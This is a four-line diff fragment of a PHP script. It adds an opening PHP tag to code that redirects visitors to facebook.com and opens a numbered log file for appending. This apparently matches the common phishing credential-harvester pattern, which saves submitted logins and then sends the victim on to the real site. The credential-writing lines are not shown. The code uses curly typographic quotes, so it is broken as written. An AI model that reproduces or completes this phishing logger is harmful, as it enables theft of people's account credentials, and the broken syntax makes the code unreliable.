@@ -1,3 +1,4 @@
+<?php
 header (‘Location: http://facebook.com ‘);
 
 $handle = fopen(“logs_86354.txt”, “a”);
